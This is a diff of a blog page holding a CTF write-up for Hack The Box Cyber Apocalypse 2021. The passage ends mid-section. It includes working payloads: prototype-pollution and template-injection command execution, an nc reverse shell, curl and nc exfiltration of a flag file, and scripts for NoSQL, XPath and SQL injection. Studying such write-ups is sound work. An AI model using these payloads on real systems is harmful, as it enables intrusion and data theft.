@@ -1,144 +1,174 @@
-<!doctype html><html lang=en>
-<head>
-<title>
-hack the box - cyber apocalypse ctf '21 ::
-#!/bin/note
-— a checkbox uncheckers notepad
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>hack the box - cyber apocalypse ctf '21 | #!/bin/note
 </title>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="foreword The HTB Cyber Apocalypse 2021 event was a nice and polished CTF. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo&amp;rsquo;s HTB! Here are the solutions for the ~20 challenges I managed to solve.
-solutions category - web - BlitzProp  Category: Web Difficulty: 1/4 Files: Web app source &amp;amp; build env   The challenge landing page already had a hint in the &amp;ldquo;ASTa la vista baby&amp;rdquo; song.">
-<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
-<meta name=robots content="noodp">
+<meta name=keywords content>
+<meta name=description content="foreword The HTB Cyber Apocalypse 2021 event was a nice and polished CTF. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo&rsquo;s HTB! Here are the solutions for the ~20 challenges I managed to solve.
+solutions category - web - BlitzProp  Category: Web Difficulty: 1/4 Files: Web app source & build env    The challenge landing page already had a hint in the &ldquo;ASTa la vista baby&rdquo; song.">
+<meta name=author content="Leon Jacobs">
 <link rel=canonical href=https://leonjza.github.io/blog/2021/04/24/hack-the-box-cyber-apocalypse-ctf-21/>
-<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
-<link rel=stylesheet href=https://leonjza.github.io/style.css>
-<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
-<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="hack the box - cyber apocalypse ctf '21">
-<meta name=twitter:description content="foreword The HTB Cyber Apocalypse 2021 event was a nice and polished CTF. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo&rsquo;s HTB! Here are the solutions for the ~20 challenges I managed to solve.
-solutions category - web - BlitzProp  Category: Web Difficulty: 1/4 Files: Web app source & build env   The challenge landing page already had a hint in the &ldquo;ASTa la vista baby&rdquo; song.">
-<meta property="og:title" content="hack the box - cyber apocalypse ctf '21">
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://leonjza.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="hack the box - cyber apocalypse ctf '21">
 <meta property="og:description" content="foreword The HTB Cyber Apocalypse 2021 event was a nice and polished CTF. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo&rsquo;s HTB! Here are the solutions for the ~20 challenges I managed to solve.
-solutions category - web - BlitzProp  Category: Web Difficulty: 1/4 Files: Web app source & build env   The challenge landing page already had a hint in the &ldquo;ASTa la vista baby&rdquo; song.">
+solutions category - web - BlitzProp  Category: Web Difficulty: 1/4 Files: Web app source & build env    The challenge landing page already had a hint in the &ldquo;ASTa la vista baby&rdquo; song.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://leonjza.github.io/blog/2021/04/24/hack-the-box-cyber-apocalypse-ctf-21/"><meta property="article:section" content="posts">
 <meta property="article:published_time" content="2021-04-24T08:41:34+02:00">
 <meta property="article:modified_time" content="2021-04-24T08:41:34+02:00"><meta property="og:site_name" content="#!/bin/note
 ">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="hack the box - cyber apocalypse ctf '21">
+<meta name=twitter:description content="foreword The HTB Cyber Apocalypse 2021 event was a nice and polished CTF. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo&rsquo;s HTB! Here are the solutions for the ~20 challenges I managed to solve.
+solutions category - web - BlitzProp  Category: Web Difficulty: 1/4 Files: Web app source & build env    The challenge landing page already had a hint in the &ldquo;ASTa la vista baby&rdquo; song.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"hack the box - cyber apocalypse ctf '21","item":"https://leonjza.github.io/blog/2021/04/24/hack-the-box-cyber-apocalypse-ctf-21/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"hack the box - cyber apocalypse ctf '21","name":"hack the box - cyber apocalypse ctf \u002721","description":"foreword The HTB Cyber Apocalypse 2021 event was a nice and polished CTF. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo\u0026rsquo;s HTB! Here are the solutions for the ~20 challenges I managed to solve.\nsolutions category - web - BlitzProp  Category: Web Difficulty: 1/4 Files: Web app source \u0026amp; build env    The challenge landing page already had a hint in the \u0026ldquo;ASTa la vista baby\u0026rdquo; song.","keywords":[],"articleBody":"  foreword The HTB Cyber Apocalypse 2021 event was a nice and polished CTF. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo’s HTB! Here are the solutions for the ~20 challenges I managed to solve.\nsolutions category - web - BlitzProp  Category: Web Difficulty: 1/4 Files: Web app source \u0026 build env    The challenge landing page already had a hint in the “ASTa la vista baby” song. Checking out the challenge source, the interesting code might not be immediately obvious.\n// file challenge/routes/index.js  const path = require('path'); const express = require('express'); const pug = require('pug'); const { unflatten } = require('flat'); const router = express.Router(); // ... snip ...  router.post('/api/submit', (req, res) = { const { song } = unflatten(req.body); //  if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) { return res.json({ 'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' }) }); //  } else { return res.json({ 'response': 'Please provide us with the name of an existing song.' }); } }); module.exports = router; The interesting calls are to unflatten() (#1) which (potentially) contains a prototype pollution vuln and to pug.compile() (#2). At first glance the pug.compile() call seems fine as you don’t control the user that gets passed in. However, combined with a prototype pollution, we can perform some AST injection in pug! We just need to pollute Object.__proto__.block so that pug.compile() interprets block.line.\nPoC Request:\nPOST /api/submit HTTP/1.1 Host: 138.68.147.232:32661 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://138.68.147.232:32661/ Content-Type: application/json Origin: http://138.68.147.232:32661 Content-Length: 22 Connection: close { \"song.name\":\"asdasd\", \"Object.__proto__.block\": { \"type\": \"Text\", \"line\": \"process.mainModule.require('child_process').execSync(`$command`)\" } } Command execution was blind, so I ran commands redirecting output to a file in the static folder, requesting that from the web server afterwards. So to get the flag using the PoC, I first ran ls /  /app/static/out.txt.\n  And then cat /flagk5NDpd.\n  Flag: CHTB{p0llute_with_styl3}\n- Inspector Gadget  Category: Web Difficulty: 1/4 Files: None  For this challenge, you just had to poke around in the console to reveal parts of the flag.\n      Flag: CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}\n- Daas  Category: Web Difficulty: 1/4 Files: None  Fuzzing this challenge you’d realise it’s a Laravel app with debug mode enabled. A recent publication revealed how to get RCE via Ignition (the fancy debug helper used in Laravel helps). I used this exploit for RCE: https://github.com/ambionics/laravel-exploits\n  I created a .phar file with phpggc to run nc  4444 -e /bin/bash to get a shell (didn’t really need this but whatever). Finding the flag was easy with that though.\n  Flag: CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}\n- MiniSTRyplace  Category: Web Difficulty: 1/4 Files: Web app source \u0026 build env  Reviewing the index.php file you’d see a classic include() call with some simple filtering where ../ is removed. To bypass it, just use ....//.\nhtml // ... snip ...  php $lang = ['en.php', 'qw.php']; include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)])); ?  To get the flag, set lang to GET /?lang=....//....//....//....//....//....//....//....//....//....//flag\nFlag: CHTB{b4d_4li3n_pr0gr4m1ng}\n- Caas  Category: Web Difficulty: 2/4 Files: Web app source \u0026 build env  A slightly more complex web app, but the interesting code was in challenge/models/CommandModel.php.\nphp class CommandModel { public function __construct($url) { $this-command = \"curl -sL \" . escapeshellcmd($url); } public function exec() { exec($this-command, $output); return $output; } } escapeshellcmd() may seem scary here, but it provides nothing in terms of security when just appending to a command like curl. They provide curl -sL , so with a POST request we append -F data=@/flag http://host to have the curl command post the /flag file to our host.\n    Flag: CHTB{f1le_r3trieval_4s_a_s3rv1ce}\n- Wild Goose Hunt  Category: Web Difficulty: 2/4 Files: Web app source \u0026 build env  A code review shows mongoose is in use, and the login endpoint does not sanitize user credentials.\n// file challenge/models/User.js  const mongoose = require('mongoose'); const Schema = mongoose.Schema; let User = new Schema({ username: { type: String }, password: { type: String } }, { collection: 'users' }); module.exports = mongoose.model('User', User); // challenge/routes/index.js  const express = require('express'); const router = express.Router(); const User = require('../models/User'); // ... snip ...  router.post('/api/login', (req, res) = { let { username, password } = req.body; if (username \u0026\u0026 password) { return User.find({ username, password }) .then((user) = { if (user.length == 1) { return res.json({logged: 1, message: `Login Successful, welcome back ${user[0].username}.` }); } else { return res.json({logged: 0, message: 'Login Failed'}); } }) .catch(() = res.json({ message: 'Something went wrong'})); } return res.json({ message: 'Invalid username or password'}); }); module.exports = router; Using username=admin\u0026password[$ne]= as credentials would log you in as the password is obviously not empty :P\n  Instead of using $ne, we can use $regex to match a part of the password in a loop in a script. If the regex matches we’ll be logged in, if not we’ll get Login Failed. My script to pwn the password (and get the flag) was:\nimport requests import string burp0_url = \"http://178.62.113.165:31453/api/login\" burp0_headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://178.62.113.165:31453/\", \"Content-Type\": \"application/x-www-form-urlencoded;charset=UTF-8\", \"Origin\": \"http://178.62.113.165:31453\", \"Connection\": \"close\" } password = \"CHTB{\" while True: for c in string.ascii_lowercase + string.digits + \"_\" + \"}\": if c in ['*','+','.','?','|']: continue tpass = f\"{password}{c}\" print(f\"trying: {tpass}\") burp0_data = {\"username\": \"admin\", \"password[$regex]\": f\"^{tpass}\"} r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) if \"Login Successful\" in r.text: password = tpass print(f\"password: {tpass}\") if \"}\" in tpass: print(f\"flag: {tpass}\") Flag: CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}\n- E.Tree  Category: Web Difficulty: 2/4 Files: XML file  XPath injection. Urgh. We get an XML file with two staff keys that also have a selfDestructCode key with the CHTB{ flag format.\n   id=\"confidential\"  staff1 confidential confidential confidential  // ... snip ...   id=\"confidential\"  staff13 confidential confidential confidential CHTB{f4k3_fl4g    id=\"confidential\"  confidential confidential confidential confidential _f0r_t3st1ng}    Sending a single quote ' in the search param reveals that the XML could not be evaluated with an lxml.etree.XPathEvalError. If the search was successful, the app would respond with This millitary staff member exists..\n  My XPath is terrible, so I wrote a script to test expressions.\nfrom lxml import etree import sys # ' or substring(//*/selfDestructCode,1,1)=C and '1 # ((//staff[selfDestructCode])[1])[starts-with(selfDestructCode, 'C')] q = f\".//*[name='{sys.argv[1]}']\" #q = f'{sys.argv[1]}' print(f'q: {q}') root = etree.parse('military.xml') res = root.xpath(q) try: iterator = iter(res) except TypeError: print(res) else: for r in res: print(etree.tostring(r, pretty_print=True)) My final payload was x' or ((//staff[selfDestructCode])[1])[starts-with(selfDestructCode, 'C')] or name='x where 1 was the first selfDestructCode match and C the first character of the flag. My pwn script needed to have the position modified to target each selfDestructCode, but that was a minor problem.\nimport requests import string burp0_url = \"http://178.62.70.150:30594/api/search\" burp0_headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://178.62.70.150:30594/\", \"Content-Type\": \"application/json\", \"Origin\": \"http://178.62.70.150:30594\", \"Connection\": \"close\" } #flag = \"CHTB{\" #flag = \"CHTB{Th3\" #flag = \"CHTB{Th3_3xTr4_l3v3l_\" flag = \"\" #flag = \"4Cc3s\" #flag = \"4Cc3s$\" #flag = \"4Cc3s$_c0nTr0l}\" code_pos = 2 while True: for c in string.printable: if c in ['\\'']: continue attempt = f'{flag}{c}' print(f'flag: {flag}, trying: {attempt}') burp0_json={\"search\": f\"x' or ((//staff[selfDestructCode])[{code_pos}])[starts-with(selfDestructCode, '{attempt}')] or name='x\"} res = requests.post(burp0_url, headers=burp0_headers, json=burp0_json) if \"This millitary staff member exists.\" in res.text: flag = attempt break Flag: CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}\n- The Galactic Times  Category: Web Difficulty: 2/4 Files: Web app source \u0026 build env  I think this challenge was broken. I spent a bunch of time on an XSS vector to get the the /alien endpoint to leak the flag via the Chrome session driven with puppeteer, until I noticed that there was also an alien.html in the static/ directory with the flag. lol\nThe /alien endpoint looked as follows:\nconst bot = require('../bot'); let db; async function router (fastify, options) { // ... snip ...  fastify.get('/alien', async (request, reply) = { if (request.ip != '127.0.0.1') { return reply.code(401).send({ message: 'Only localhost is allowed'}); } return reply.sendFile('alien.html'); }); // ... snip ... } module.exports = database = { db = database; return router; };     Flag: CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}\n- emoji voting  Category: Web Difficulty: 2/4 Files: Web app source \u0026 build env  First, take a moment to appreciate this landing page :D\n  The list endpoint had an order parameter which defaulted to count DESC. However, this value flowed into a raw database query (#1).\nconst sqlite = require('sqlite-async'); const crypto = require('crypto'); class Database { constructor(db_file) { this.db_file = db_file; this.db = undefined; } // ... snip ...  async getEmojis(order) { // TOOD: add parametrization  return new Promise(async (resolve, reject) = { try { let query = `SELECT * FROM emojis ORDER BY ${ order }`; //  resolve(await this.db.all(query)); } catch(e) { reject(e); } }); } } module.exports = Database; ORDER BY injections are a little tricky, and by default it looked like sqlmap did not detect this automatically. I took a little bit of time to try and get sqlmap to detect \u0026 pwn it, but did not win. This is totally something that I think I should try and add. Anyways, I wrote a custom script instead. To help understand the query, checkout this post.\nTo get the flag we needed to enum two values. The database table name where the flag is stored, and the flag itself. The table name was being randomised, as you’d see in the flag_${ rand }; references where ${rand} was a JavaScript variable.\nDROP TABLE IF EXISTS emojis; DROP TABLE IF EXISTS flag_${ rand }; CREATE TABLE IF NOT EXISTS flag_${ rand } ( flag TEXT NOT NULL ); INSERT INTO flag_${ rand } (flag) VALUES ('CHTB{f4k3_fl4g_f0r_t3st1ng}'); CREATE TABLE IF NOT EXISTS emojis ( id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, emoji VARCHAR(255), name VARCHAR(255), count INTEGERT ); INSERT INTO emojis (emoji, name, count) VALUES ('👽', 'alien', 13), ('🛸', 'flying saucer', 3), ('👾', 'alien monster', 0), ('💩', '👇 = human', 118), ('🚽', '👇 = human', 19), ('🪠', '👇 = human', 2), ('🍆', 'eggplant', 69), ('🍑', 'peach', 40), ('🍌', 'banana', 21), ('🐶', 'dog', 80), ('🐷', 'pig', 37), ('👨', 'homo idiotus', 124) My SQL injection payload was (CASE WHEN(SELECT SUBSTR(tbl_name, {pos}, 1) FROM sqlite_master WHERE type='table' and tbl_name like 'flag%')='{c}' THEN emoji ELSE id END) ASC where pos was the character position and c the character I was brute forcing. If char c at position pos was correct, the results would have been sorted by emojis, and if not, sorted by id. This was the oracle used to determine true/false values and ultimately leak the table and flag values.\nI used two slightly modified scripts to use different character sets. The table rand value was hex only, the flag was a larger set. The payload was also slightly different once the table name was known.\n# file pwn_table.py import requests import string burp0_url = \"http://46.101.80.23:31737/api/list\" burp0_cookies = {\"PHPSESSID\": \"2fb52e27704a6f06e7b528f47df0dfd9\"} burp0_headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://46.101.23.157:30629/\", \"Content-Type\": \"application/json\", \"Origin\": \"http://46.101.23.157:30629\", \"Connection\": \"close\" } table_name = () # eventually: flag_5d02dc7099  pos = 1 def is_true(r): return r.json()[0]['id'] == 7 def is_false(r): return r.json()[0]['id'] == 1 while True: for c in \"a\" + \"b\" + \"c\" + \"d\" + \"e\" + \"f\" + \"l\" + \"g\" + \"_\" + string.digits: print(f'have: {\"\".join(table_name)}= trying: {c}') query = f\"(CASE WHEN(SELECT SUBSTR(tbl_name, {pos}, 1) FROM sqlite_master WHERE type='table' and tbl_name like 'flag%')='{c}' THEN emoji ELSE id END) ASC\" burp0_json={ \"order\": query } res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json) if is_true(res): table_name = table_name + (c,) pos+=1 continue import requests import string import sys burp0_url = \"http://46.101.23.157:30629/api/list\" burp0_cookies = {\"PHPSESSID\": \"2fb52e27704a6f06e7b528f47df0dfd9\"} burp0_headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://46.101.23.157:30629/\", \"Content-Type\": \"application/json\", \"Origin\": \"http://46.101.23.157:30629\", \"Connection\": \"close\" } flag = () pos = 1 def is_true(r): return r.json()[0]['id'] == 7 def is_false(r): return r.json()[0]['id'] == 1 while True: for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation: if len(c.strip())  0 or c in ['\\'']: continue print(f'pos: {pos}= have: {\"\".join(flag)}= trying: {c}') query = f\"(CASE WHEN(SELECT SUBSTR(flag, {pos}, 1) FROM flag_5d02dc7099 LIMIT 1)='{c}' THEN emoji ELSE id END) ASC;\" burp0_json={ \"order\": query } res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json) if is_true(res): flag = flag + (c,) pos+=1 continue if '}' in ''.join(flag): print(f'flag: {\"\".join(flag)}') sys.exit(0) Flag: CHTB{order_me_this_juicy_info}\n- Starfleet  Category: Web Difficulty: 3/4 Files: Web app source \u0026 build env  A field was expecting an email address to send an email to, enrolling you to the starfleet academy. A code review showed that the email address was populated in a string, and nunjucks used to render template (#1) in what looked like a typical template injection.\nconst nodemailer = require('nodemailer'); const nunjucks = require('nunjucks'); module.exports = { async sendEmail(emailAddress) { return new Promise(async (resolve, reject) = { try { let message = { to: emailAddress, subject: 'Enrollment is now under review ✅', }; if (process.env.NODE_ENV === 'production' ) { let gifSrc = 'minimakelaris@hackthebox.eu'; // #1  message.html = nunjucks.renderString(` Hello ${ emailAddress }\nA cat has been deployed to process your submission 🐈\n `, { gifSrc } ); message.attachments = [ { filename: 'minimakelaris.gif', path: __dirname + '/../assets/minimakelaris.gif', cid: gifSrc } ]; let transporter = nodemailer.createTransport({ host: 'smtp.gmail.com', port: 465, secure: true, auth: { user: 'cbctf.2021.web.newjucks@gmail.com', pass: '[REDACTED]', }, logger: true }); transporter.sendMail(message); transporter.close(); resolve({ response: 'The email has been sent' }); // ... snip ...  } catch(e) { reject({ response: 'Something went wrong', 'err': e, 'err.msg': e.message }); } }) } }; This post described pretty much exactly that. In our case the injection was blind, and an email address was always required. Thankfully we could specify template tags ({{ }}) after an email address to bypass that validation, while injecting a shell command.\nThe challenge flag was protected but made available through a binary at /readflag (a simple setuid bin that would just cat the protected flag). I’m not sure why that effort was made, as the method I used meant I could run any OS command. Anyways. My final request looked like this:\nPOST /api/enroll HTTP/1.1 Host: 138.68.178.56:32689 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://138.68.178.56:32689/ Content-Type: application/json Origin: http://138.68.178.56:32689 Content-Length: 169 Connection: close {\"email\":\"leon@leon {{ range.constructor(\\\"console.log(global.process.mainModule.require('child_process').execSync('/readflag | nc  4444').toString())\\\")() }}\"}   Flag: CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}\ncategory - reversing - Authenticator  Category: Reversing Difficulty: 1/4 Files: ELF 64-bit LSB pie executable  Running the program you have to enter an Alien ID, which could be retrieved in a dissasembler as an argument passed to strcmp()\n    Entering 11337 would then prompt for a Pin:.\nA function called checkpin() took the input you entered at the Pin: prompt, and ran an XOR 9 operation over each character, checking that the character matched a value in the al register.\n  To test what the values were being compared to, I added a breakpoint before the cmp BYTE PTR [rbp-0x1d], al operation and printed the register. Having entered a long string at the Pin: prompt, I also set the value in the al register to the expected value to see what future correct values were.\n  Using the jsdec decompiler in Cutter, I also saw the string that was being compared to after running the XOR operation on the input buffer. So, to reveal the flag I just wrote a python one-liner to XOR that string.\n   ''.join([chr((ord(x)) ^ 9) for x in \"}a:Vh|}a:g}8j=}89gVFlag: CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}\n- Passphrase  Category: Reversing Difficulty: 1/4 Files: ELF 64-bit LSB pie executable  A quick one. The program asks for a passphrase.\n  Disassembling the binary, you’d see a bunch of bytes being moved that follow the typical flag format in between a bunch of other valid calls.\n  Enter those as the passphrase and you’re done!\n  Flag: CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}\ncategory - Forensics - Key Mission  Category: Forensics Difficulty: 1/4 Files: Pcap  We get a USB pcap for a “BlackWidow Ultimate 2016” Keyboard. Key inputs are in a “HID Data” field and not usb.capdata which I was used to.\n  Without knowing the field name to get the HID Data, I learnt that you can output as pdml using tshark (tshark -r key_mission.pcap -T pdml) to get all of the fields in a packet that you can use with -T fields for the -e flag.\nAnyways, extract keypresses with tshark -r key_mission.pcap -T fields -e usbhid.data | sed 's/../:\u0026/g2'  presses and use ctf-usb-keyboard-parser to convert them to ASCII.\n  Flag: CHTB{a_plac3_fAr_fAr_away_fr0m_earth}\n- Invitation  Category: Forensics Difficulty: 1/4 Files: Word Docm Document  We get a macro enabled word document, so I used ViperMonkey to extract and analyse it. The resultant PowerShell command was extracted can be seen on CyberChef here. In between all of the nastiness, the two (formatted) statements of interest were.\n. ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join( '' , ([REGeX]::MaTCHES( \")'x'+]31[DIlLeHs$+]1[DiLLehs$ (\u0026| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(\" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} )) ) SEt (\"G8\"+\"h\") ( \" ) )63]Rahc[,'raZ'EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[( eCAlpERc- )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . \" ); -jOIn ( lS (\"VAR\"+\"IaB\"+\"LE:g\"+\"8H\") ).VALue[ - 1.. - ( ( lS (\"VAR\"+\"IaB\"+\"LE:g\"+\"8H\") ).VALue.LengtH)] | IeX I booted a Windows VM to try and deobfuscate the statements a little. The first one I reduced to the following and ran in a PowerShell session:\n[strinG]::join( '' , ([REGeX]::MaTCHES( \")'x'+]31[DIlLeHs$+]1[DiLLehs$ (\u0026| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(\" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} ))   That resulted in:\n('iqwreg'+'p ='+' jXtCH'+'T'+'B{'+'maldocs_arej'+'Xt;').REPLACe('iqw','$').REPLACe('jXt',[sTRInG][chAR]34) |\u0026( $sheLLiD[1]+$sHeLlID[13]+'x') If you look closely, you should spot a part of the flag as CHTB{maldocs_are. Notice the calls to replace() which make it more obvious. The second interesting statement I mentioned, you should see a part of the flag that is reversed: '}atem_we'+'n_eht'+'. Reverse by hand and put them together to get the flag.\nFlag: CHTB{maldocs_are_the_new_meta}\ncategory - Hardware - Serial Logs  Category: Hardware Difficulty: 1/4 Files: .sal file  After figuring out what a .sal file was, I downloaded the Windows Logic Analyzer software from Saleae here. Open up the .sal file and you’d see a waveform of sorts. It took a bit of time to figure out how to use Logic2 application, but eventually I got to the point where I added a Async Serial Analyzer and chose 115200 as the bit rate (a guess).\n  In the terminal view you could see some clear text “logs”, with the last readable entry saying that the baud rate has changed, followed by gibberish.\n  With a clear hint that the baud rate changed, the next step was to figure out what the new baud rate was. Looking at the waveform zoomed out pretty far you could see the collapsed pulses being visually different together with the ASCII representation of the bytes Logic2 shows.\n  Calculating baud is something I have struggled with before in previous work. This time though I came across a really good post helping clear up some of the math here. The TL;DR is that the formula to use to calculate the baud rate is 1/(smallest 1/0 time) / 10e-6. If we look at the waveform at two different times, one where the known baud is 115200 and another time where the new baud is used, you can see the pulse timing being clearly different.\n115200 baud\n  Unknown baud\n  To test the formula, I tried to see if I can get to 115200. The shortest pulse I could find was 8.48us.\n 1/(8.48*10e-6) 11792.452830188677 With 115200 being expected, but getting 11792, there was definitely something off. Multiplying by 10e-7 would move the decimal up one place giving is at least a closer hit, but it was not 115200. I changed the existing Async Serial analyser to 117924 to see if that would work, and to my surprise, it did. Heh! So it sort of works out :P\nThat meant I could soft of work out the new baud rate.\n 1/(13.46*10e-7) 74294.20505200594 Updating the Async Serial analyser with a new baud rate of 74294, we see the terminal now showing the original log entries we could see as gibberish, but the new ones in printable ASCII revealing the flag.\n  Flag: CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52}\n- Compromised  Category: Hardware Difficulty: 1/4 Files: .sal file  Another sal file, this time with data in two channels. I looked for analysers that accepted two channels and found the I2C analyser.\n  The resultant data table showed many ASCII printable characters, so I figured I at least had the right analyser chosen. I exported the data to the clipboard and pasted it into a text file for further processing.\n  A closer look showed that the data had a start/stop sequence, writing one byte at a time. You also could see this when you zoomed the analysed wave form.\n    The raw data also had an address instruction, which was either 4 or ,. Knowing the flag format, we could see that when the , address is used, valid characters are written. A simple grep on that extracted data where the , address is used reveals the flag.\n  Flag: CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}\ncategory - Misc - Alien Camp  Category: Misc Difficulty: 